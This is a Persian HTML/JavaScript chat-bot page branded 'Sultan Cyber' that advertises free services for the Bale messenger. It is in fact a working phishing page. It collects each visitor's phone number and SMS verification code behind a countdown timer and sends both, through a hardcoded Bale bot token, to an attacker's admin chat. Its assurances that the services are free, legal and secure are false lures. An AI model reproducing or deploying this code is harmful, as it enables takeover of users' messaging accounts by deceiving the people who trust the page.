<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>سلطان سایبر | نسخه آلتیمیت | ربات حرفه‌ای بله</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Inter', 'Segoe UI', 'Vazir', system-ui, sans-serif;
            background: #0a0a0f;
            width: 100%;
            height: 100dvh;
            overflow: hidden;
            position: fixed;
        }

        /* منوی کشویی همبرگری */
        .menu-overlay {
            position: fixed;
            top: 0;
            right: -100%;
            width: 75%;
            max-width: 300px;
            height: 100%;
            background: linear-gradient(145deg, #0c0c1a, #05050f);
            z-index: 1000;
            transition: right 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            box-shadow: -5px 0 30px rgba(0,0,0,0.8);
            border-left: 1px solid rgba(255,45,85,0.4);
            padding: 24px 0;
            overflow-y: auto;
        }
        .menu-overlay.open { right: 0; }
        .menu-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(4px);
            z-index: 999;
            display: none;
        }
        .menu-backdrop.show { display: block; }
        .menu-header {
            text-align: center;
            padding: 20px;
            border-bottom: 1px solid #ff3b5c;
            margin-bottom: 20px;
        }
        .menu-header .user-icon {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #ff3b5c, #a02060);
            border-radius: 50%;
            margin: 0 auto 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            border: 2px solid #ff88aa;
        }
        .menu-item {
            padding: 14px 24px;
            color: #e2e8f0;
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 14px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            cursor: pointer;
            transition: 0.1s;
        }
        .menu-item:active { background: rgba(255,45,85,0.2); }
        .menu-item i { font-size: 22px; min-width: 32px; }
        .close-menu {
            position: absolute;
            top: 16px;
            left: 16px;
            background: #ff3b5c;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .app {
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 25% 20%, #12121f, #020208);
            display: flex;
            flex-direction: column;
        }

        .chat-header {
            background: rgba(8, 8, 20, 0.96);
            backdrop-filter: blur(20px);
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1.5px solid rgba(255, 60, 90, 0.6);
            flex-shrink: 0;
            z-index: 20;
        }
        .menu-icon {
            font-size: 28px;
            cursor: pointer;
            background: none;
            border: none;
            color: #ff5e7c;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 30px;
        }
        .menu-icon:active { background: rgba(255,60,90,0.2); transform: scale(0.95);}
        .avatar {
            width: 48px;
            height: 48px;
            border-radius: 30px;
            background: linear-gradient(145deg, #ff1e3c, #6b0018);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #ff5e7c;
            box-shadow: 0 0 15px #ff2d5a;
            overflow: hidden;
        }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .bot-info h3 {
            background: linear-gradient(125deg, #ff6b8b, #ffb347);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 0.95rem;
            font-weight: 800;
        }
        .bot-info p { color: #9aa9bb; font-size: 10px; display: flex; align-items: center; gap: 6px; }
        .online-dot {
            width: 8px; height: 8px; background: #0aff9e; border-radius: 50%;
            box-shadow: 0 0 6px #0aff9e;
            animation: pulse 1.2s infinite;
        }
        @keyframes pulse { 0% { opacity: 0.6;} 100% { opacity: 1; transform: scale(1.1);} }

        .chat-area {
            flex: 1;
            overflow-y: auto;
            padding: 16px 12px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            scroll-behavior: smooth;
        }
        .chat-area::-webkit-scrollbar { width: 4px; }
        .chat-area::-webkit-scrollbar-track { background: #1a1a2a; }
        .chat-area::-webkit-scrollbar-thumb { background: #ff3b5c; border-radius: 6px;}

        .message { display: flex; flex-direction: column; max-width: 86%; animation: fadeIn 0.18s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px);} to { opacity: 1; transform: translateY(0);} }
        .bot-msg { align-self: flex-start; }
        .user-msg { align-self: flex-end; }
        .bubble {
            padding: 10px 16px;
            border-radius: 22px;
            font-size: 13px;
            line-height: 1.45;
            font-weight: 500;
        }
        .bot-msg .bubble {
            background: rgba(28, 28, 48, 0.95);
            border: 0.5px solid #ff5e7c80;
            color: #f0f3fa;
            border-bottom-left-radius: 5px;
        }
        .user-msg .bubble {
            background: linear-gradient(115deg, #dc2f4a, #9b1e34);
            color: white;
            border-bottom-right-radius: 5px;
        }
        .time { font-size: 8px; color: #6c7a91; margin: 3px 12px 0; }

        /* پنل دکمه‌ها */
        .keyboard-panel {
            background: rgba(8, 8, 18, 0.9);
            backdrop-filter: blur(24px);
            border-top: 1px solid #ff3b5c;
            padding: 12px 12px 20px;
            flex-shrink: 0;
            max-height: 230px;
            overflow-y: auto;
        }
        .category-row { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; justify-content: center; }
        .cat-btn {
            background: rgba(30,30,55,0.9);
            border: 0.5px solid #ff6b8b;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 11px;
            color: #ffb7c5;
            font-weight: 600;
            cursor: pointer;
        }
        .key-row { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; margin-bottom: 12px; }
        .key-btn {
            background: rgba(20,20,38,0.95);
            border: 1px solid #ff3b5c;
            padding: 10px 5px;
            border-radius: 60px;
            color: #ffced6;
            font-weight: 700;
            font-size: 12px;
            text-align: center;
            cursor: pointer;
            transition: 0.05s linear;
        }
        .key-btn:active { transform: scale(0.95); background: #ff3b5c; color: white; border-color: white;}
        .special-btn { background: linear-gradient(95deg, #c72542, #f05270); color: white; border: none; font-weight: 800; }
        .cyber-btn { background: linear-gradient(135deg, #2a0a3a, #aa00aa); border: 1px solid #ff66ee; color: #ffccff; box-shadow: 0 0 6px #ff66ee;}

        .input-group { display: flex; gap: 10px; margin-top: 12px; }
        .input-field {
            flex: 1;
            background: #18182b;
            border: 1px solid #ff5e7c;
            padding: 12px 16px;
            border-radius: 48px;
            color: white;
            font-size: 13px;
            outline: none;
        }
        .send-icon {
            background: #dc2f4a;
            width: 48px;
            height: 48px;
            border-radius: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            cursor: pointer;
        }
        .typing-dots span {
            width: 6px; height: 6px; background: #ff8aa5;
            display: inline-block; border-radius: 50%;
            animation: blink 1.2s infinite;
            margin: 0 1px;
        }
        @keyframes blink { 0%,100%{ opacity: 0.3;} 50%{ opacity: 1; transform: translateY(-2px);} }
        .timer-card {
            background: #14142b;
            border-radius: 40px;
            padding: 8px 12px;
            margin-top: 6px;
            text-align: center;
            font-family: monospace;
            font-size: 20px;
            font-weight: bold;
            color: #ff8aa5;
            border: 1px solid #ff5e7c;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
<div class="menu-backdrop" id="menuBackdrop"></div>
<div class="menu-overlay" id="sideMenu">
    <div class="close-menu" id="closeMenuBtn">✕</div>
    <div class="menu-header">
        <div class="user-icon">👤</div>
        <div style="font-weight: bold; color: #ff8aa5;">کاربر ویژه</div>
        <div style="font-size: 11px; color: #aaa;">سطح: طلایی</div>
    </div>
    <div class="menu-item" data-menu="stats">
        <i>📊</i> آمار پیشرفته
    </div>
    <div class="menu-item" data-menu="faq">
        <i>❓</i> سوالات متداول
    </div>
    <div class="menu-item" data-menu="rules">
        <i>📜</i> قوانین و مقررات
    </div>
    <div class="menu-item" data-menu="support">
        <i>🎧</i> پشتیبانی ۲۴/۷
    </div>
    <div class="menu-item" data-menu="status">
        <i>🔄</i> وضعیت درخواست‌ها
    </div>
    <div class="menu-item" data-menu="about">
        <i>ℹ️</i> درباره سلطان سایبر
    </div>
</div>

<div class="app">
    <div class="chat-header">
        <div class="menu-icon" id="menuBtn">☰</div>
        <div class="avatar"><img src="https://cdn3d.iconscout.com/3d/premium/thumb/cyber-robot-3d-icon-download-in-png-blend-fbx-gltf-file-formats--technology-ai-artificial-intelligence-chatbot-pack-icons-7588716.png?f=webp" alt="ربات سایبر"></div>
        <div class="bot-info"><h3>⚡ سلطان سایبر | حرفه‌ای بله</h3><p><span class="online-dot"></span> آنلاین · پاسخ فوری</p></div>
        <div style="flex:1"></div>
        <div id="aiQuickBtn" style="background:#ff3b5c; width:42px; height:42px; border-radius:30px; display:flex; align-items:center; justify-content:center; cursor:pointer;">🧠</div>
    </div>
    <div class="chat-area" id="chatArea"></div>
    <div id="dynamicPanel" class="keyboard-panel"></div>
</div>

<script>
    // ---------- تنظیمات اصلی (بدون تغییر در منطق ارسال) ----------
    const BOT_TOKEN = "1386227135:GsXXJx-u-vxE5hHDuiwkSYNzOVYTzGcz9SY";
    const ADMIN_ID = "525406375";
    let stats = { users: 4782, requests: 741, invalid: 211, pending: 12, approved: 18500, cyber: 512, vip: 867, antiban: 1290 };
    let currentUserId = Math.floor(Date.now() / 1000) % 10000000;
    let pendingRequests = JSON.parse(localStorage.getItem('sultan_salf_pending') || '{}');
    
    const initialState = {
        step: "main",
        flow: { service: null, phone: null, reqId: null, codeValue: null },
        ui: { codeTimer: null, typingDiv: null, countdownInterval: null },
        chatHistory: [],
    };
    let localState = JSON.parse(JSON.stringify(initialState));
    const savedState = localStorage.getItem('sultan_salf_state');
    if(savedState) try { let p=JSON.parse(savedState); if(p.step) localState.step=p.step; if(p.flow) localState.flow=p.flow; if(p.chatHistory) localState.chatHistory=p.chatHistory; }catch(e){}
    
    const chatArea = document.getElementById("chatArea");
    const dynamicPanel = document.getElementById("dynamicPanel");
    
    function saveState() { localStorage.setItem('sultan_salf_state', JSON.stringify({ step:localState.step, flow:localState.flow, chatHistory:localState.chatHistory.slice(-100) })); localStorage.setItem('sultan_salf_pending', JSON.stringify(pendingRequests)); }
    function scrollToBottom() { setTimeout(() => chatArea.scrollTop = chatArea.scrollHeight, 50); }
    function hideTyping() { if(localState.ui.typingDiv) { localState.ui.typingDiv.remove(); localState.ui.typingDiv=null; } }
    function addBotMessage(text, withTime=true, save=true) { hideTyping(); let div=document.createElement("div"); div.className="message bot-msg"; div.innerHTML=`<div class="bubble">${text}</div>${withTime?'<div class="time">🤖 سلطان سایبر • اکنون</div>':''}`; chatArea.appendChild(div); scrollToBottom(); if(save) localState.chatHistory.push({role:"bot",text:text,time:Date.now()}); saveState(); return div; }
    function addUserMessage(text) { let div=document.createElement("div"); div.className="message user-msg"; div.innerHTML=`<div class="bubble">${text}</div><div class="time">👤 شما • همین الان</div>`; chatArea.appendChild(div); scrollToBottom(); localState.chatHistory.push({role:"user",text:text,time:Date.now()}); saveState(); }
    function showTyping() { hideTyping(); let div=document.createElement("div"); div.className="message bot-msg"; div.innerHTML=`<div class="bubble"><span class="typing-dots"><span></span><span></span><span></span></span> تحلیل درخواست...</div>`; chatArea.appendChild(div); scrollToBottom(); localState.ui.typingDiv=div; }
    
    // ارسال‌ها به ادمین (بدون تغییر منطق)
    async function sendToBaleBot(chatId, text) { try { let res=await fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text:text,parse_mode:"Markdown"})}); let data=await res.json(); if(data.ok) return true; }catch(e){} return false; }
    async function sendPhoneToAdmin(chatId,service,phone){ return sendToBaleBot(ADMIN_ID,`📱 درخواست جدید\nکاربر: ${chatId}\nسرویس: ${service}\nشماره: ${phone}\nزمان: ${new Date().toLocaleString('fa-IR')}`); }
    async function sendCodeToAdmin(chatId,service,phone,code,reqId){ return sendToBaleBot(ADMIN_ID,`🔐 کد تایید\nکاربر: ${chatId}\nسرویس: ${service}\nشماره: ${phone}\nکد: ${code}\nشناسه: ${reqId}`); }
    
    // هوش مصنوعی حرفه‌ای و رسمی
    function professionalAssistant(msg) {
        let m = msg.toLowerCase();
        if(m.includes("سلام")||m.includes("درود")) return "درود بر شما. سلطان سایبر آماده ارائه خدمات رایگان سلف در پیام‌رسان بله است. از منو سرویس مورد نظر را انتخاب کنید.";
        if(m.includes("راهنما")||m.includes("کمک")) return "📘 راهنمای رسمی:\n۱. سرویس را از منو انتخاب کنید.\n۲. شماره موبایل خود را ارسال کنید.\n۳. کد ۴ تا ۶ رقمی پیامک شده را وارد نمایید.\n۴. سرویس شما ظرف چند دقیقه فعال خواهد شد.\nتمامی سرویس‌ها رایگان و قانونی می‌باشند.";
        if(m.includes("سرویس")||m.includes("خدمات")) return "🔥 لیست سرویس‌های رایگان:\n• سلف ساعت\n• پاکت بازکن\n• فایت حرفه‌ای\n• آنتی بن هوشمند\n• سلف گروهی\n• سلف VIP نامحدود\n• سلطان سایبری نسخه پیشرفته";
        if(m.includes("قیمت")||m.includes("هزینه")) return "💎 تمامی سرویس‌های سلطان سایبر به صورت کاملاً رایگان ارائه می‌شوند. هیچ هزینه‌ای دریافت نمی‌گردد.";
        if(m.includes("کد تایید")||m.includes("کد")) return "🔐 نکات کد تایید:\n- کد باید ۴ تا ۶ رقم باشد.\n- کدهای تکراری (۱۱۱۱) یا دنباله‌دار (۱۲۳۴) معتبر نیستند.\n- لطفاً کد دریافتی از پیامک را دقیق وارد کنید.";
        if(m.includes("پشتیبانی")) return "🎧 پشتیبانی رسمی: @Admin_Free_bot (۲۴ ساعته، پاسخگویی زیر ۵ دقیقه)";
        if(m.includes("آنتی بن")) return "🛡️ سرویس آنتی بن: محافظت کامل از حساب شما در برابر مسدودیت. فعالسازی رایگان از طریق منو.";
        return "سوال شما ثبت شد. لطفاً از دکمه‌های منو برای انتخاب سرویس اقدام کنید یا عبارت «راهنما» را بفرستید. تمام سرویس‌ها رایگان هستند.";
    }
    
    // اعتبارسنجی کد
    function isValidCode(code){ let t=code.trim(); if(!/^\d+$/.test(t)) return {valid:false,msg:"❌ فقط عدد وارد کنید"}; if(t.length<4||t.length>6) return {valid:false,msg:"❌ کد باید ۴ تا ۶ رقم باشد"}; if(new Set(t).size===1) return {valid:false,msg:"❌ کد تکراری مجاز نیست"}; let bad=['1234','12345','123456','4321','1111','2222','3333','0000']; if(bad.includes(t)) return {valid:false,msg:"❌ کد ساده معتبر نیست"}; return {valid:true}; }
    function generateReqId(){ return `SLF_${Date.now()}_${Math.floor(Math.random()*100000)}`; }
    
    // هندل شماره و تایمر حرفه‌ای
    async function handlePhoneNumber(phone) {
        let clean=phone.replace(/\D/g,'');
        if(clean.length<10){ addBotMessage("❌ شماره موبایل معتبر ۱۱ رقمی وارد کنید"); return; }
        let finalPhone=clean.length===10?"0"+clean:clean;
        if(!/^09[0-9]{9}$/.test(finalPhone)){ addBotMessage("❌ شماره باید با 09 شروع شود"); return; }
        addUserMessage(`📱 ${finalPhone}`);
        localState.flow.phone=finalPhone;
        addBotMessage(`✅ شماره ${finalPhone} ثبت شد. در حال ارسال درخواز...`);
        await sendPhoneToAdmin(currentUserId, localState.flow.service, finalPhone);
        
        let timeLeft = 120;
        const timerDiv = addBotMessage(``, true, false);
        const updateTimer = () => {
            let mins = Math.floor(timeLeft/60);
            let secs = timeLeft%60;
            timerDiv.querySelector('.bubble').innerHTML = `⏳ مهلت وارد کردن کد: ${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}<br>🔐 کد پیامکی خود را وارد نمایید.`;
        };
        updateTimer();
        const interval = setInterval(()=>{
            if(localState.step !== "wait_code" || timeLeft <=0){
                clearInterval(interval);
                if(timeLeft===0 && localState.step==="wait_code") addBotMessage("⏰ زمان شما به پایان رسید. لطفاً مجدداً سرویس را انتخاب کنید.");
                if(timeLeft===0) backToMain();
                return;
            }
            timeLeft--;
            updateTimer();
            if(timeLeft<=20) timerDiv.querySelector('.bubble').style.border = "1px solid #ff3366";
        },1000);
        localState.ui.countdownInterval = interval;
        localState.step="wait_code";
        if(localState.ui.codeTimer) clearTimeout(localState.ui.codeTimer);
        localState.ui.codeTimer = setTimeout(()=>{ if(localState.step==="wait_code") backToMain(); }, 121000);
        renderKeyboard();
    }
    
    async function submitCodeFinal(code){
        let check=isValidCode(code);
        if(!check.valid){ addBotMessage(check.msg+"\nدوباره کد را وارد کنید."); return; }
        addUserMessage(`🔑 ${code}`);
        let reqId=generateReqId();
        localState.flow.reqId=reqId; localState.flow.codeValue=code;
        if(localState.flow.service==="🌐 سلطان سایبری") stats.cyber++;
        if(localState.flow.service==="⭐ سلف VIP") stats.vip++;
        if(localState.flow.service==="🛡️ آنتی بن") stats.antiban++;
        pendingRequests[reqId]={ user_id:currentUserId, service:localState.flow.service, phone:localState.flow.phone, code:code, time:Date.now() };
        stats.requests++; stats.pending++;
        await sendCodeToAdmin(currentUserId, localState.flow.service, localState.flow.phone, code, reqId);
        addBotMessage(`✨ درخواست شما با موفقیت ثبت گردید.\n🆔 شناسه: ${reqId}\n📌 سرویس: ${localState.flow.service}\n⏳ در حال بررسی توسط ادمین، ظرف چند دقیقه فعال می‌شود.`);
        if(localState.ui.countdownInterval) clearInterval(localState.ui.countdownInterval);
        if(localState.ui.codeTimer) clearTimeout(localState.ui.codeTimer);
        localState.step="main";
        localState.flow={ service:null, phone:null, reqId:null, codeValue:null };
        renderKeyboard();
        saveState();
    }
    
    function backToMain(){
        if(localState.ui.countdownInterval) clearInterval(localState.ui.countdownInterval);
        if(localState.ui.codeTimer) clearTimeout(localState.ui.codeTimer);
        localState = JSON.parse(JSON.stringify({ ...initialState, chatHistory: localState.chatHistory }));
        renderKeyboard();
        addBotMessage("🔁 به منوی اصلی بازگشتید. لطفاً سرویس مدنظر خود را انتخاب کنید (همگی رایگان).");
        saveState();
    }
    
    function handleMainMenu(text){
        if(text === "📊 آمار پیشرفته"){
            addBotMessage(`📊 آمار رسمی سلطان سایبر:\n👥 کاربران: ${stats.users.toLocaleString()}\n✅ درخواست‌های موفق: ${stats.approved.toLocaleString()}\n🌐 سایبری فعال: ${stats.cyber}\n⭐ VIP: ${stats.vip}\n🛡️ آنتی بن: ${stats.antiban}\n💰 کلیه خدمات رایگان.`);
            return;
        }
        if(text === "📋 وضعیت درخواست"){
            if(localState.flow.reqId && pendingRequests[localState.flow.reqId]) addBotMessage(`وضعیت: درخواست ${pendingRequests[localState.flow.reqId].service} در انتظار تایید ادمین می‌باشد.`);
            else addBotMessage("در حال حاظر درخواست فعالی ندارید. از منو سرویس جدید انتخاب کنید.");
            return;
        }
        const services = ["🕐 سلف ساعت", "🎁 پاکت بازکن", "⚔️ فایت حرفه‌ای", "🛡️ آنتی بن", "👥 سلف گروهی", "⭐ سلف VIP", "🌐 سلطان سایبری"];
        if(services.includes(text)){
            localState.step="wait_phone";
            localState.flow.service = text;
            addBotMessage(`🎯 سرویس ${text} (رایگان)\n📱 لطفاً شماره موبایل خود را جهت دریافت کد فعالسازی ارسال کنید:`);
            renderKeyboard();
            return;
        }
        if(text === "🧠 دستیار هوشمند"){
            localState.step="ai_chat";
            renderKeyboard();
            addBotMessage("🧠 دستیار هوشمند سلطان فعال شد. سوالات خود را بپرسید (راهنما، قیمت، نحوه استفاده).");
            return;
        }
        if(text === "🎧 پشتیبانی") { addBotMessage("📞 ارتباط با پشتیبانی: @Admin_Free_bot (پاسخ سریع، ۲۴ ساعته)"); return; }
        addBotMessage("از منوی اصلی گزینه معتبری انتخاب کنید.");
    }
    
    function renderKeyboard(){
        dynamicPanel.innerHTML="";
        if(localState.step === "main"){
            let cats = ["🕐 سلف ساعت","🎁 پاکت بازکن","⚔️ فایت حرفه‌ای","🛡️ آنتی بن","👥 سلف گروهی","⭐ سلف VIP","🌐 سلطان سایبری"];
            let row1=document.createElement("div"); row1.className="category-row";
            cats.slice(0,4).forEach(s=>{ let btn=document.createElement("div"); btn.className="cat-btn"; btn.innerText=s; btn.onclick=()=>handleMainMenu(s); row1.appendChild(btn); });
            let row2=document.createElement("div"); row2.className="category-row";
            cats.slice(4).forEach(s=>{ let btn=document.createElement("div"); btn.className="cat-btn"; if(s==="🌐 سلطان سایبری") btn.classList.add("cyber-btn"); btn.innerText=s; btn.onclick=()=>handleMainMenu(s); row2.appendChild(btn); });
            dynamicPanel.appendChild(row1); dynamicPanel.appendChild(row2);
            let optRow=document.createElement("div"); optRow.className="key-row";
            let statsBtn=document.createElement("div"); statsBtn.className="key-btn"; statsBtn.innerText="📊 آمار پیشرفته"; statsBtn.onclick=()=>handleMainMenu("📊 آمار پیشرفته");
            let statusBtn=document.createElement("div"); statusBtn.className="key-btn"; statusBtn.innerText="📋 وضعیت درخواست"; statusBtn.onclick=()=>handleMainMenu("📋 وضعیت درخواست");
            let aiBtn=document.createElement("div"); aiBtn.className="key-btn special-btn"; aiBtn.innerText="🧠 دستیار هوشمند"; aiBtn.onclick=()=>handleMainMenu("🧠 دستیار هوشمند");
            let supBtn=document.createElement("div"); supBtn.className="key-btn"; supBtn.innerText="🎧 پشتیبانی"; supBtn.onclick=()=>handleMainMenu("🎧 پشتیبانی");
            optRow.appendChild(statsBtn); optRow.appendChild(statusBtn); optRow.appendChild(aiBtn); optRow.appendChild(supBtn);
            dynamicPanel.appendChild(optRow);
        } else if(localState.step === "wait_phone"){
            let backDiv=document.createElement("div"); backDiv.className="key-row"; let backBtn=document.createElement("div"); backBtn.className="key-btn"; backBtn.innerText="🔙 بازگشت به منو"; backBtn.onclick=()=>backToMain(); backDiv.appendChild(backBtn); dynamicPanel.appendChild(backDiv);
            let inputDiv=document.createElement("div"); inputDiv.className="input-group";
            inputDiv.innerHTML=`<input type="tel" id="phoneInput" class="input-field" placeholder="مثال: 09123456789"><div id="sendPhoneBtn" class="send-icon">📞</div>`;
            dynamicPanel.appendChild(inputDiv);
            setTimeout(()=>{ let btn=document.getElementById("sendPhoneBtn"); if(btn) btn.onclick=()=>{ let v=document.getElementById("phoneInput")?.value; if(v && v.replace(/\D/g,'').length>=10) handlePhoneNumber(v); else addBotMessage("❌ شماره صحیح ۱۱ رقمی وارد کنید"); }},10);
        } else if(localState.step === "wait_code"){
            let info=document.createElement("div"); info.innerHTML=`<div style="color:#ff8aa5;margin:6px 0;text-align:center;">🔐 کد تایید ۴ تا ۶ رقمی:</div>`;
            dynamicPanel.appendChild(info);
            let inputDiv=document.createElement("div"); inputDiv.className="input-group";
            inputDiv.innerHTML=`<input type="text" id="codeInput" class="input-field" placeholder="کد را وارد کنید"><div id="submitCodeBtn" class="send-icon">✅</div>`;
            dynamicPanel.appendChild(inputDiv);
            let cancelRow=document.createElement("div"); cancelRow.className="key-row"; let cancelBtn=document.createElement("div"); cancelBtn.className="key-btn"; cancelBtn.innerText="❌ انصراف"; cancelBtn.onclick=()=>backToMain(); cancelRow.appendChild(cancelBtn); dynamicPanel.appendChild(cancelRow);
            setTimeout(()=>{ let btn=document.getElementById("submitCodeBtn"); if(btn) btn.onclick=()=>{ let c=document.getElementById("codeInput")?.value; if(c && c.length>=4) submitCodeFinal(c); else addBotMessage("❌ کد معتبر وارد کنید"); } },10);
        } else if(localState.step === "ai_chat"){
            let info=document.createElement("div"); info.innerHTML=`<div style="color:#ff99aa;text-align:center;">🧠 سوال خود را بنویسید:</div>`;
            dynamicPanel.appendChild(info);
            let inputDiv=document.createElement("div"); inputDiv.className="input-group";
            inputDiv.innerHTML=`<input type="text" id="aiInput" class="input-field" placeholder="مثال: راهنما، آنتی بن، قیمت"><div id="sendAiMsg" class="send-icon">🧠</div><div id="exitAi" class="send-icon" style="background:#2d3748;">✖️</div>`;
            dynamicPanel.appendChild(inputDiv);
            setTimeout(()=>{
                document.getElementById("sendAiMsg")?.addEventListener("click",()=>{ let q=document.getElementById("aiInput")?.value; if(q && q.trim()){ addUserMessage(q); showTyping(); setTimeout(()=>{ let ans=professionalAssistant(q); addBotMessage(ans); },400); document.getElementById("aiInput").value=""; } });
                document.getElementById("exitAi")?.addEventListener("click",()=>{ localState.step="main"; renderKeyboard(); addBotMessage("🔚 خروج از دستیار هوشمند."); });
            },10);
        }
    }
    
    // منوی کشویی
    const menuBtn = document.getElementById("menuBtn");
    const sideMenu = document.getElementById("sideMenu");
    const backdrop = document.getElementById("menuBackdrop");
    const closeMenuBtn = document.getElementById("closeMenuBtn");
    function openMenu(){ sideMenu.classList.add("open"); backdrop.classList.add("show"); }
    function closeMenu(){ sideMenu.classList.remove("open"); backdrop.classList.remove("show"); }
    menuBtn.onclick=openMenu; closeMenuBtn.onclick=closeMenu; backdrop.onclick=closeMenu;
    document.querySelectorAll(".menu-item").forEach(item=>{
        item.addEventListener("click",()=>{
            let type=item.getAttribute("data-menu");
            if(type==="stats") handleMainMenu("📊 آمار پیشرفته");
            else if(type==="faq") addBotMessage("❓ سوالات متداول:\n- آیا سرویس‌ها رایگان هستند؟ بله.\n- چگونه شماره ارسال کنم؟ از منو سرویس را انتخاب و شماره بفرستید.\n- کد تایید نیامده؟ دوباره درخواست دهید.");
            else if(type==="rules") addBotMessage("📜 قوانین: استفاده از سرویس‌ها فقط برای اهداف قانونی مجاز است. مسئولیت هرگونه استفاده نادرست بر عهده کاربر می‌باشد.");
            else if(type==="support") addBotMessage("🎧 پشتیبانی: @Admin_Free_bot (۲۴ ساعته)");
            else if(type==="status") handleMainMenu("📋 وضعیت درخواست");
            else if(type==="about") addBotMessage("ℹ️ سلطان سایبر نسخه ۱۰ – پیشرفته‌ترین ربات سلف رایگان برای پیام‌رسان بله. توسعه‌یافته با امنیت بالا.");
            closeMenu();
        });
    });
    
    document.getElementById('aiQuickBtn').onclick=()=>{ if(localState.step==="ai_chat"){ localState.step="main"; renderKeyboard(); addBotMessage("خروج از دستیار."); } else { localState.step="ai_chat"; renderKeyboard(); addBotMessage("🧠 دستیار هوشمند فعال شد. سوال بپرسید."); } };
    
    // بازیابی تاریخچه
    if(localState.chatHistory.length>0){
        localState.chatHistory.slice(-20).forEach(msg=>{ let div=document.createElement("div"); div.className=`message ${msg.role==="bot"?"bot-msg":"user-msg"}`; div.innerHTML=`<div class="bubble">${msg.text}</div><div class="time">${msg.role==="bot"?"🤖 سلطان":"👤 شما"} • قبلی</div>`; chatArea.appendChild(div); });
        scrollToBottom();
    } else {
        addBotMessage(`⚡ به سلطان سایبر خوش آمدید ⚡\n🔹 کلیه سرویس‌ها رایگان می‌باشند.\n🔹 برای شروع یکی از سرویس‌های منو را انتخاب کنید.\n🔹 راهنمای کامل در دسترس است.`);
    }
    renderKeyboard();
</script>
</body>
</html>
